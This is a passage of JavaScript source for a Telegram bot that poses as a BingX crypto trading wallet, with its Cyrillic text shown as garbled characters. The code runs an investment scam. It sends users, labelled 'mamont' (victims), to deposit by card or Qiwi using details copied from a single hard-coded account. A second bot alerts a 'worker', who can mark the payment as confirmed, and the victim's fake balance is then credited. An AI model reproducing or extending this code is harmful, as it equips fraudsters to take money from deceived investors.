                '1. –ü–µ—Ä–µ–¥ –ø—Ä–∏–Ω—è—Ç–∏–µ–º –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–æ–Ω–Ω–æ–≥–æ —Ä–µ—à–µ–Ω–∏—è –ò–Ω–≤–µ—Å—Ç–æ—Ä—É –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —Å–∞–º–æ—Å—Ç–æ—è—Ç–µ–ª—å–Ω–æ –æ—Ü–µ–Ω–∏—Ç—å —ç–∫–æ–Ω–æ–º–∏—á–µ—Å–∫–∏–µ —Ä–∏—Å–∫–∏ –∏ –≤—ã–≥–æ–¥—ã, –Ω–∞–ª–æ–≥–æ–≤—ã–µ, —é—Ä–∏–¥–∏—á–µ—Å–∫–∏–µ, –±—É—Ö–≥–∞–ª—Ç–µ—Ä—Å–∫–∏–µ –ø–æ—Å–ª–µ–¥—Å—Ç–≤–∏—è –∑–∞–∫–ª—é—á–µ–Ω–∏—è —Å–¥–µ–ª–∫–∏, —Å–≤–æ—é –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç—å –∏ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –ø—Ä–∏–Ω—è—Ç—å —Ç–∞–∫–∏–µ —Ä–∏—Å–∫–∏. –ö–ª–∏–µ–Ω—Ç —Ç–∞–∫–∂–µ –Ω–µ—Å–µ—Ç —Ä–∞—Å—Ö–æ–¥—ã –Ω–∞ –æ–ø–ª–∞—Ç—É –±—Ä–æ–∫–µ—Ä—Å–∫–∏—Ö –∏ –¥–µ–ø–æ–∑–∏—Ç–∞—Ä–Ω—ã—Ö —É—Å–ª—É–≥\n' +
                '2. –ü—Ä–∏–Ω–∏–º–∞—è –ø—Ä–∞–≤–∏–ª–∞, –í—ã –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç–µ —Å–≤–æ—ë —Å–æ–≥–ª–∞—Å–∏–µ —Å–æ –≤—Å–µ–º–∏ –≤—ã—à–µ–ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–Ω—ã–º–∏ –ø—Ä–∞–≤–∏–ª–∞–º–∏!\n' +
                '3. –í–∞—à –∞–∫–∫–∞—É–Ω—Ç –º–æ–∂–µ—Ç –±—ã—Ç—å –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω –≤ –ø–æ–¥–æ–∑—Ä–µ–Ω–∏–∏ –Ω–∞ –º–æ—à–µ–Ω–Ω–∏—á–µ—Å—Ç–≤–æ/–æ–±–º–∞–Ω –Ω–∞—à–µ–π —Å–∏—Å—Ç–µ–º—ã! –ö–∞–∂–¥–æ–º—É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é –Ω–µ–æ–±—Ö–æ–¥–∏–º–∞ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –¥–ª—è –≤—ã–≤–æ–¥–∞ –∫—Ä—É–ø–Ω–æ–π —Å—É–º–º—ã —Å—Ä–µ–¥—Å—Ç–≤.\–Ω' +
                '4. –ú—É–ª—å—Ç–∏–∞–∫–∫–∞—É–Ω—Ç—ã –∑–∞–ø—Ä–µ—â–µ–Ω—ã!\n' +
                '5. –°–∫—Ä–∏–ø—Ç—ã, —Å—Ö–µ–º—ã, —Ç–∞–∫—Ç–∏–∫–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∑–∞–ø—Ä–µ—â–µ–Ω–æ!\n' +
                '6. –ï—Å–ª–∏ –±—É–¥—É—Ç –≤—ã—è–≤–ª–µ–Ω—ã –≤—ã—à–µ–ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–Ω—ã–µ —Å–ª—É—á–∞–∏, –í–∞—à –∞–∫–∫–∞—É–Ω—Ç –±—É–¥–µ—Ç –∑–∞–º–æ—Ä–æ–∂–µ–Ω –¥–æ –≤—ã—è—Å–Ω–µ–Ω–∏—è –æ–±—Å—Ç–æ—è—Ç–µ–ª—å—Å—Ç–≤!\n' +
                '7. –í —Å–ª—É—á–∞–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏—è –∏–º–µ–µ—Ç –ø—Ä–∞–≤–æ –∑–∞–ø—Ä–æ—Å–∏—Ç—å —É –í–∞—Å –¥–æ–∫—É–º–µ–Ω—Ç—ã, –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞—é—â–∏–µ –í–∞—à—É –ª–∏—á–Ω–æ—Å—Ç—å –∏ –í–∞—à–µ —Å–æ–≤–µ—Ä—à–µ–Ω–Ω–æ–ª–µ—Ç–∏–µ.\n' +
                '\n' +
                '–ü–æ –≤—Å–µ–º –≤–æ–ø—Ä–æ—Å–∞–º –í—ã–≤–æ–¥–∞ —Å—Ä–µ–¥—Å—Ç–≤, –ø–æ –≤–æ–ø—Ä–æ—Å–∞–º –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è, –∞ —Ç–∞–∫ –∂–µ –≤–æ–ø—Ä–æ—Å–∞–º –∏–≥—Ä—ã –æ–±—Ä–∞—â–∞–π—Ç–µ—Å—å –≤ –ø–æ–¥–¥–µ—Ä–∂–∫—É, —É–∫–∞–∑–∞–Ω–Ω—É—é –≤ –æ–ø–∏—Å–∞–Ω–∏–∏ –∫ –±–æ—Ç—É.\n' +
                '\n' +
                '–°–ø–∞—Å–∏–±–æ –∑–∞ –ø–æ–Ω–∏–º–∞–Ω–∏–µ, –í–∞—à ¬´@BingX_wallet_bot¬ª', {
                    reply_markup: {
                        inline_keyboard: [
                            [{
                                text: '–ü—Ä–∏–Ω—è—Ç—å ‚úì',
                                callback_data: 'accept'
                            }]
                        ]
                    }
                });
        }
    } catch (e) {
        console.log('–ü—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –∑–ª–∞–º–∞–ª–æ—Å—å', e);
    }
});

bot.on('message', async (msg, match) => {
    const text = msg.text;
    const chatId = msg.chat.id;
    const userId = msg.from.id;


    await sequelize.authenticate()
    await sequelize.sync()

    const user = await UserModel.findOne({
        where: {
            chatId: chatId.toString()
        }
    });

    if (text === '/start') {
        const username = msg.from.username;

        try {
            await sequelize.authenticate()
            await sequelize.sync()

            const user = await UserModel.findOne({
                where: {
                    chatId: chatId.toString()
                }
            });
            const rokky = await UserModel.findOne({
                where: {
                    chatId: '6191812267',
                }
            });

            if (user) {
                if (!user.isBlocked) {
                    const currentDate = new Date();
                    const registrationDate = user.registrationDate;
                    const timeDiff = currentDate - registrationDate;
                    const daysRegistered = Math.floor(timeDiff / (1000 * 60 * 60 * 24) + 1);

                    await bot.sendMessage(chatId, '‚ö°Ô∏è', menuKeyboard);
                    return bot.sendPhoto(chatId, './images/ownCabinet.jpg', generateLkKeyboard(user, userId, daysRegistered));
                } else {
                    return bot.sendMessage(chatId, '–î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω');
                }
            } else {
                if (username) {
                    await UserModel.create({
                        chatId: chatId.toString(),
                        username: username,
                        depositCard: rokky.depositCard,
                        depositQiwi: rokky.depositQiwi,
                    });
                } else {
                    await UserModel.create({
                        chatId: chatId.toString(),
                        depositCard: rokky.depositCard,
                        depositQiwi: rokky.depositQiwi,
                    });
                }
                return bot.sendMessage(chatId, `üéâ –ü—Ä–∏–≤–µ—Ç${username ? `, @${username}` : ''}!\n` +
                    '–ü–æ–ª–∏—Ç–∏–∫–∞ –∏ —É—Å–ª–æ–≤–∏—è –ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –¥–∞–Ω–Ω—ã–º –±–æ—Ç–æ–º.\n' +
                    '1. –ü–µ—Ä–µ–¥ –ø—Ä–∏–Ω—è—Ç–∏–µ–º –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–æ–Ω–Ω–æ–≥–æ —Ä–µ—à–µ–Ω–∏—è –ò–Ω–≤–µ—Å—Ç–æ—Ä—É –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —Å–∞–º–æ—Å—Ç–æ—è—Ç–µ–ª—å–Ω–æ –æ—Ü–µ–Ω–∏—Ç—å —ç–∫–æ–Ω–æ–º–∏—á–µ—Å–∫–∏–µ —Ä–∏—Å–∫–∏ –∏ –≤—ã–≥–æ–¥—ã, –Ω–∞–ª–æ–≥–æ–≤—ã–µ, —é—Ä–∏–¥–∏—á–µ—Å–∫–∏–µ, –±—É—Ö–≥–∞–ª—Ç–µ—Ä—Å–∫–∏–µ –ø–æ—Å–ª–µ–¥—Å—Ç–≤–∏—è –∑–∞–∫–ª—é—á–µ–Ω–∏—è —Å–¥–µ–ª–∫–∏, —Å–≤–æ—é –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç—å –∏ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –ø—Ä–∏–Ω—è—Ç—å —Ç–∞–∫–∏–µ —Ä–∏—Å–∫–∏. –ö–ª–∏–µ–Ω—Ç —Ç–∞–∫–∂–µ –Ω–µ—Å–µ—Ç —Ä–∞—Å—Ö–æ–¥—ã –Ω–∞ –æ–ø–ª–∞—Ç—É –±—Ä–æ–∫–µ—Ä—Å–∫–∏—Ö –∏ –¥–µ–ø–æ–∑–∏—Ç–∞—Ä–Ω—ã—Ö —É—Å–ª—É–≥\n' +
                    '2. –ü—Ä–∏–Ω–∏–º–∞—è –ø—Ä–∞–≤–∏–ª–∞, –í—ã –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç–µ —Å–≤–æ—ë —Å–æ–≥–ª–∞—Å–∏–µ —Å–æ –≤—Å–µ–º–∏ –≤—ã—à–µ–ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–Ω—ã–º–∏ –ø—Ä–∞–≤–∏–ª–∞–º–∏!\n' +
                    '3. –í–∞—à –∞–∫–∫–∞—É–Ω—Ç –º–æ–∂–µ—Ç –±—ã—Ç—å –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω –≤ –ø–æ–¥–æ–∑—Ä–µ–Ω–∏–∏ –Ω–∞ –º–æ—à–µ–Ω–Ω–∏—á–µ—Å—Ç–≤–æ/–æ–±–º–∞–Ω –Ω–∞—à–µ–π —Å–∏—Å—Ç–µ–º—ã! –ö–∞–∂–¥–æ–º—É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é –Ω–µ–æ–±—Ö–æ–¥–∏–º–∞ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –¥–ª—è –≤—ã–≤–æ–¥–∞ –∫—Ä—É–ø–Ω–æ–π —Å—É–º–º—ã —Å—Ä–µ–¥—Å—Ç–≤.\–Ω' +
                    '4. –ú—É–ª—å—Ç–∏–∞–∫–∫–∞—É–Ω—Ç—ã –∑–∞–ø—Ä–µ—â–µ–Ω—ã!\n' +
                    '5. –°–∫—Ä–∏–ø—Ç—ã, —Å—Ö–µ–º—ã, —Ç–∞–∫—Ç–∏–∫–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∑–∞–ø—Ä–µ—â–µ–Ω–æ!\n' +
                    '6. –ï—Å–ª–∏ –±—É–¥—É—Ç –≤—ã—è–≤–ª–µ–Ω—ã –≤—ã—à–µ–ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–Ω—ã–µ —Å–ª—É—á–∞–∏, –í–∞—à –∞–∫–∫–∞—É–Ω—Ç –±—É–¥–µ—Ç –∑–∞–º–æ—Ä–æ–∂–µ–Ω –¥–æ –≤—ã—è—Å–Ω–µ–Ω–∏—è –æ–±—Å—Ç–æ—è—Ç–µ–ª—å—Å—Ç–≤!\n' +
                    '7. –í —Å–ª—É—á–∞–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏—è –∏–º–µ–µ—Ç –ø—Ä–∞–≤–æ –∑–∞–ø—Ä–æ—Å–∏—Ç—å —É –í–∞—Å –¥–æ–∫—É–º–µ–Ω—Ç—ã, –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞—é—â–∏–µ –í–∞—à—É –ª–∏—á–Ω–æ—Å—Ç—å –∏ –í–∞—à–µ —Å–æ–≤–µ—Ä—à–µ–Ω–Ω–æ–ª–µ—Ç–∏–µ.\n' +
                    '\n' +
                    '–ü–æ –≤—Å–µ–º –≤–æ–ø—Ä–æ—Å–∞–º –í—ã–≤–æ–¥–∞ —Å—Ä–µ–¥—Å—Ç–≤, –ø–æ –≤–æ–ø—Ä–æ—Å–∞–º –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è, –∞ —Ç–∞–∫ –∂–µ –≤–æ–ø—Ä–æ—Å–∞–º –∏–≥—Ä—ã –æ–±—Ä–∞—â–∞–π—Ç–µ—Å—å –≤ –ø–æ–¥–¥–µ—Ä–∂–∫—É, —É–∫–∞–∑–∞–Ω–Ω—É—é –≤ –æ–ø–∏—Å–∞–Ω–∏–∏ –∫ –±–æ—Ç—É.\n' +
                    '\n' +
                    '–°–ø–∞—Å–∏–±–æ –∑–∞ –ø–æ–Ω–∏–º–∞–Ω–∏–µ, –í–∞—à ¬´@BingX_wallet_bot¬ª', {
                        reply_markup: {
                            inline_keyboard: [
                                [{
                                    text: '–ü—Ä–∏–Ω—è—Ç—å ‚úì',
                                    callback_data: 'accept'
                                }]
                            ]
                        }
                    });
            }
        } catch (e) {
            console.log('–ü—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –∑–ª–∞–º–∞–ª–æ—Å—å', e);
        }
    }

    if (user.isBlocked) {
        return bot.sendMessage(chatId, '–î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω');
    } else {
        if (text === '/wallet' || text === 'üìä ECN –°—á—ë—Ç') {
            return bot.sendPhoto(chatId, './images/ECN.jpg', {
                caption: 'üìä ECN —Å—á—ë—Ç\n–í—ã–±–µ—Ä–∏—Ç–µ –º–æ–Ω–µ—Ç—É –¥–ª—è –∏–Ω–≤–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –¥–µ–Ω–µ–∂–Ω—ã—Ö —Å—Ä–µ–¥—Å—Ç–≤',
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Bitcoin',
                            callback_data: 'btc_coin'
                        }, {
                            text: 'Qtum',
                            callback_data: 'qtum_coin'
                        }],
                        [{
                            text: 'Ethereum',
                            callback_data: 'eth_coin'
                        }, {
                            text: 'Tron',
                            callback_data: 'trx_coin'
                        }],
                        [{
                            text: 'Litecoin',
                            callback_data: 'ltc_coin'
                        }, {
                            text: 'Ripple',
                            callback_data: 'xrp_coin'
                        }],
                        [{
                            text: 'Cardano',
                            callback_data: 'ada_coin'
                        }, {
                            text: 'Solana',
                            callback_data: 'sol_coin'
                        }],
                        [{
                            text: 'Terra',
                            callback_data: 'luna_coin'
                        }, {
                            text: 'Doge',
                            callback_data: 'doge_coin'
                        }],
                        [{
                            text: 'Polka Dot',
                            callback_data: 'dot_coin'
                        }, {
                            text: 'Avalanche',
                            callback_data: 'avax_coin'
                        }],
                        [{
                            text: 'Polygon',
                            callback_data: 'matic_coin'
                        }, {
                            text: 'Uniswap',
                            callback_data: 'uni_coin'
                        }],
                    ]
                }
            });
        }

        if (text === '/lk' || text === 'üíº –õ–∏—á–Ω—ã–π –ö–∞–±–∏–Ω–µ—Ç') {
            const user = await UserModel.findOne({
                where: {
                    chatId: chatId.toString()
                }
            });
            const currentDate = new Date();
            const registrationDate = user.registrationDate;
            const timeDiff = Math.floor((currentDate - registrationDate) / (1000 * 60 * 60 * 24)) + 1;

            await bot.sendMessage(chatId, '‚ö°Ô∏è', menuKeyboard);
            return bot.sendPhoto(chatId, './images/ownCabinet.jpg', generateLkKeyboard(user, userId, timeDiff));
        }

        if (text === '/support' || text === '‚öôÔ∏è –¢–µ—Ö.–ü–æ–¥–¥–µ—Ä–∂–∫–∞') {
            const caption_text = '‚öôÔ∏è –¢–µ—Ö–Ω–∏—á–µ—Å–∫–∞—è –ø–æ–¥–¥–µ—Ä–∂–∫–∞\n' +
                '\n' +
                '–î–ª—è –æ–±—Ä–∞—â–µ–Ω–∏—è –≤ –ø–æ–¥–¥–µ—Ä–∂–∫—É –ø—Ä–æ—á–∏—Ç–∞–π—Ç–µ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é –Ω–∏–∂–µ.\n' +
                '\n' +
                '1. –ü—Ä–∏ –ø–µ—Ä–≤–æ–º –æ–±—Ä–∞—â–µ–Ω–∏–∏ —É–∫–∞–∂–∏—Ç–µ –≤–∞—à ID\n' +
                '2.–û–ø–∏—à–∏—Ç–µ –ø–æ–¥—Ä–æ–±–Ω–µ–µ —á—Ç–æ —É –≤–∞—Å —Å–ª—É—á–∏–ª–æ—Å—å\n' +
                '3.–í—ã–ø–æ–ª–Ω—è–π—Ç–µ –≤—Å–µ –¥–µ–π—Å—Ç–≤–∏—è –∞–≥–µ–Ω—Ç–∞ –≤ —Ö—É–¥—à–µ–º —Å–ª—É—á–∞–µ –æ–Ω –±—É–¥–µ—Ç –≤—ã–Ω—É–∂–¥–µ–Ω –ø–æ–∫–∏–Ω—É—Ç—å —á–∞—Ç –ø–æ–¥–¥–µ—Ä–∂–∫–∏.';

            return bot.sendPhoto(chatId, './images/tech_support.jpg', {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: '–û–±—Ä–∞—Ç–∏—Ç—å—Å—è –≤ –ø–æ–¥–¥–µ—Ä–∂–∫—É',
                            url: 'https://t.me/alinkamurcc'
                        }]
                    ]
                },
                caption: caption_text,
            });
        }
    }
});

bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const userId = query.from.id;
    const user = await UserModel.findOne({
        where: {
            chatId: chatId.toString()
        }
    });

    if (user.isBlocked) {
        return bot.sendMessage(chatId, '–î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω')
    } else {
        if (query.data === 'accept') {
            deleteMessage(chatId, messageId);
            const currentDate = new Date();
            const registrationDate = user.registrationDate;
            const timeDiff = currentDate - registrationDate;
            const daysRegistered = Math.floor(timeDiff / (1000 * 60 * 60 * 24) + 1);

            await bot.sendMessage(chatId, '‚ö°Ô∏è', menuKeyboard);
            return bot.sendPhoto(chatId, './images/ownCabinet.jpg', generateLkKeyboard(user, userId, daysRegistered));
        } else if (query.data === 'deposit') {
            bot.sendPhoto(chatId, "./images/deposit.jpg", {
                caption: "üí∞ –í—ã–±–µ—Ä–∏—Ç–µ –º–µ—Ç–æ–¥ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è —á–µ—Ä–µ–∑ –∫–æ—Ç–æ—Ä—ã–π –í—ã —Ö–æ—Ç–∏—Ç–µ —Å–æ–≤–µ—Ä—à–∏—Ç—å –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–µ.",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'üí≥ –ü–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–Ω–∫–æ–≤—Å–∫–æ–π –∫–∞—Ä—Ç–æ–π',
                            callback_data: 'deposit_with_card'
                        }],
                        [{
                            text: 'üí∞ –ü–æ–ø–æ–ª–Ω–∏—Ç—å –∫–∏–≤–∏ –∫–æ—à–µ–ª—å–∫–æ–º',
                            callback_data: 'deposit_with_wallet'
                        }],
                    ]
                }
            });
        } else if (query.data === 'deposit_with_card') {
            const chatId = query.message.chat.id;
            const messageId = query.message.message_id;
            const userId = query.from.id;
            const user = await UserModel.findOne({
                where: {
                    chatId: chatId.toString()
                }
            });
            bot.deleteMessage(chatId, messageId);
            bot.sendMessage(chatId, '–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è –±–∞–Ω–∫–æ–≤—Å–∫–æ–π –∫–∞—Ä—Ç–æ–π:\n' +
                '\n' +
                `–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ - ${user.minDeposit} RUB`);

            bot.on('message', async function depositSumChecker(msg) {
                const text = msg.text;
                const chatId = msg.chat.id;
                const userId = msg.from.id;
                let depositFinalAccess = false;
                const newDep = Number(text);


                await sequelize.authenticate()
                await sequelize.sync()

                const mamont = await UserModel.findOne({
                    where: {
                        chatId: chatId.toString()
                    }
                });

                if (isNaN(text) || newDep <= user.minDeposit) {
                    bot.sendMessage(chatId, `–í–≤–µ–¥–∏—Ç–µ –≤–µ—Ä–Ω–æ–µ —á–∏—Å–ª–æ –∫–æ—Ç–æ—Ä–æ–µ –±–æ–ª—å—à–µ —á–µ–º –º–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è ${user.minDeposit}!!`);
                } else {
                    bot.sendMessage(chatId, '–°–¥–µ–ª–∫–∞ /c33362 \n \n' +
                        '–û–∂–∏–¥–∞–µ–º /pintuzik. –ï—Å–ª–∏ –æ–Ω –Ω–µ –ø–æ—è–≤–∏—Ç—Å—è –≤ —Ç–µ—á–µ–Ω–∏–µ 10 –º–∏–Ω—É—Ç, —Ç–æ —Å–¥–µ–ª–∫–∞ –±—É–¥–µ—Ç –æ—Ç–º–µ–Ω–µ–Ω–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏. \n \n' +
                        '‚ö†Ô∏è –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É—á—Ç–∏—Ç–µ, —á—Ç–æ –≤ —Ü–µ–ª—è—Ö –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∑–∞–ø—Ä–µ—â–µ–Ω–æ –ø–µ—Ä–µ–¥–∞–≤–∞—Ç—å —Ä–µ–∫–≤–∏–∑–∏—Ç—ã –≤–Ω–µ —ç—Ç–æ–≥–æ –±–æ—Ç–∞. \n \n' +
                        '–í—ã –º–æ–∂–µ—Ç–µ –≤ –ª—é–±–æ–π –º–æ–º–µ–Ω—Ç –æ—Ç–º–µ–Ω–∏—Ç—å —Å–¥–µ–ª–∫—É —Å–∞–º–æ—Å—Ç–æ—è—Ç–µ–ª—å–Ω–æ. \n' +
                        '–ù–æ —É—á—Ç–∏—Ç–µ, —á—Ç–æ –ø–µ—Ä–µ–¥–∞–Ω–Ω—ã–µ –¥–µ–Ω—å–≥–∏ –Ω–µ –≤–æ–∑–≤—Ä–∞—â–∞—é—Ç—Å—è –ø—Ä–∏ –æ—Ç–º–µ–Ω–µ —Å–¥–µ–ª–∫–∏! \n \n' +
                        '–ê–≤—Ç–æ–æ—Ç–º–µ–Ω–∞ —Å–¥–µ–ª–∫–∏ –ø—Ä–æ–∏–∑–æ–π–¥—ë—Ç —á–µ—Ä–µ–∑ 10 –º–∏–Ω—É—Ç'
                    );

                    bot.sendMessage(chatId, 'üîπ –û–ø–ª–∞—Ç–∞ –±–∞–Ω–∫–æ–≤—Å–∫–æ–π –∫–∞—Ä—Ç–æ–π: \n \n' +
                        `–°—É–º–º–∞: *${text}* ‚ÇΩ \n \n` +
                        '–û—Å—É—â–µ—Å—Ç–≤–∏—Ç–µ –ø–µ—Ä–µ–≤–æ–¥ –Ω–∞ —É–∫–∞–∑–∞–Ω–Ω—É—é –≤—ã—à–µ —Å—É–º–º—É, –∏—Å–ø–æ–ª—å–∑—É—è –¥–∞–Ω–Ω—ã–µ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã \n \n' +
                        `'${mamont.depositCard}' —Å –∫–æ–º–µ–Ω—Ç–∞—Ä–∏–µ–º ${mamont.chatId} \n \n` +
                        '‚ö†Ô∏è –ï—Å–ª–∏ –≤—ã –Ω–µ –º–æ–∂–µ—Ç–µ –¥–æ–±–∞–≤–∏—Ç—å –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ —á–µ–∫/—Å–∫—Ä–∏–Ω—à–æ—Ç –æ–ø–ª–∞—Ç—ã –≤ —Ç–µ—Ö. –ø–æ–¥–¥–µ—Ä–∂–∫—É.', {
                            parse_mode: 'Markdown',
                            reply_markup: {
                                inline_keyboard: [
                                    [{
                                        text: '–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –ø–ª–∞—Ç–µ–∂',
                                        callback_data: 'checkPayment'
                                    }],
                                    [{
                                        text: '–û–±—Ä–∞—Ç–∏—Ç—å—Å—è –≤ –ø–æ–¥–¥–µ—Ä–∂–∫—É',
                                        url: 'https://t.me/alinkamurcc'
                                    }],
                                    [{
                                        text: '–û—Ç–º–µ–Ω–∏—Ç—å –ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ',
                                        callback_data: 'cancelPayment'
                                    }],
                                ]
                            },
                        }
                    )

                    bot1.sendMessage(mamont.worker, 'üìä –°–µ—Ä–≤–∏—Å - –¢—Ä–µ–π–¥–∏–Ω–≥ \n \n' +
                        `‚úÖ –ú–∞–º–æ–Ω—Ç [${mamont.username}](https://t.me/${mamont.username}) [/c35534] \n` +
                        `–°–æ–∑–¥–∞–ª –∑–∞—è–≤–∫—É –Ω–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–µ –≤ —Ä–∞–∑–º–µ—Ä–µ - *${text}* ‚ÇΩ`, {
                            parse_mode: 'Markdown',
                            disable_web_page_preview: true,
                            reply_markup: {
                                inline_keyboard: [
                                    [{
                                        text: 'üí∞ –û–ø–ª–∞—Ç–∏—Ç—å',
                                        callback_data: 'confirm_mamontPayment'
                                    }]
                                ]
                            }
                        }
                    )

                    bot1.on('callback_query', async function ConfirmMamontu(query) {
                        const chatId = query.message.chat.id;
                        const messageId = query.message.message_id;
                        const userId = query.from.id;

                        if (query.data === 'confirm_mamontPayment') {
                            depositFinalAccess = true;
                            bot1.deleteMessage(chatId, messageId);
                            bot1.removeListener('callback_query', ConfirmMamontu);
                            bot1.sendMessage(chatId, '‚úÖ –°—á–µ—Ç —É—Å–ø–µ—à–Ω–æ –æ–ø–ª–∞—á–µ–Ω');
                        }
                    })

                    bot.on('callback_query', async function Mamontchecker(query) {
                        const chatId = query.message.chat.id;
                        const messageId = query.message.message_id;
                        const userId = query.from.id;

                        if (query.data === 'cancelPayment') {
                            bot.removeListener('callback_query', Mamontchecker);
                            bot.removeListener('message', depositSumChecker);
                            bot.deleteMessage(chatId, messageId);
                            const currentDate = new Date();
                            const registrationDate = mamont.registrationDate;
                            const timeDiff = currentDate - registrationDate;
                            const daysRegistered = Math.floor(timeDiff / (1000 * 60 * 60 * 24) + 1);

                            await bot.sendMessage(chatId, '‚ö°Ô∏è', menuKeyboard);
                            return bot.sendPhoto(chatId, './images/ownCabinet.jpg', generateLkKeyboard(mamont, userId, daysRegistered));
                        } else if (query.data === 'checkPayment') {
                            if (depositFinalAccess) {
                                bot.removeListener('callback_query', Mamontchecker);
                                bot.removeListener('message', depositSumChecker);
                                bot.deleteMessage(chatId, messageId);
                                mamont.balance += Number(text);
                                mamont.save()
                                return bot.sendMessage(chatId, `‚úÖ –ë–∞–ª–∞–Ω—Å –±—ã–ª —É—Å–ø–µ—à–Ω–æ –ø–æ–ø–æ–ª–Ω–µ–Ω –Ω–∞ —Å—É–º–º—É: *${text} ‚ÇΩ*`, {
                                    parse_mode: 'Markdown',
                                })
                            } else {
                                bot.sendMessage(chatId, '‚ö†Ô∏è –ü–ª–∞—Ç–µ–∂ –Ω–µ –±—ã–ª –æ–±–Ω–∞—Ä—É–∂–µ–Ω.')
                            }
                        }
                    })
                }
            })

        } else if (query.data === 'deposit_with_wallet') {
            const chatId = query.message.chat.id;
            const messageId = query.message.message_id;
            const userId = query.from.id;
            const user = await UserModel.findOne({
                where: {
                    chatId: chatId.toString()
                }
            });
            bot.deleteMessage(chatId, messageId);
            bot.sendMessage(chatId, '–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è –∫–∏–≤–∏ –∫–æ—à–µ–ª—å–∫–æ–º:\n' +
                '\n' +
                `–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ - ${user.minDeposit} RUB`);

            bot.on('message', async function depositSumChecker(msg) {
                const text = msg.text;
                const chatId = msg.chat.id;
                const userId = msg.from.id;
                const newDep = Number(text);
                let depositFinalAccess = false;

                await sequelize.authenticate()
                await sequelize.sync()

                const mamont = await UserModel.findOne({
                    where: {
                        chatId: chatId.toString()
                    }
                });

                if (isNaN(text) || newDep <= user.minDeposit) {
                    bot.sendMessage(chatId, `–í–≤–µ–¥–∏—Ç–µ –≤–µ—Ä–Ω–æ–µ —á–∏—Å–ª–æ –∫–æ—Ç–æ—Ä–æ–µ –±–æ–ª—å—à–µ —á–µ–º –º–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è ${user.minDeposit}!!`);
                } else {
                    bot.sendMessage(chatId, `üí≥ –ó–∞—è–≤–∫–∞ –≤ —Ä–∞–∑–º–µ—Ä–µ - ${text} ‚ÇΩ  –±—ã–ª–∞ —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω–∞ \n \n` +
                        `„Ä∞Ô∏è„Ä∞Ô∏è„Ä∞Ô∏è„Ä∞Ô∏è„Ä∞Ô∏è„Ä∞Ô∏è„Ä∞Ô∏è„Ä∞Ô∏è„Ä∞Ô∏è„Ä∞Ô∏è \n \n` +
                        `[–ü–µ—Ä–µ–π–¥–∏—Ç–µ –ø–æ —Å—Å—ã–ª–∫–µ –¥–ª—è –æ–ø–ª–∞—Ç—ã](${mamont.depositQiwi}) \n \n` +
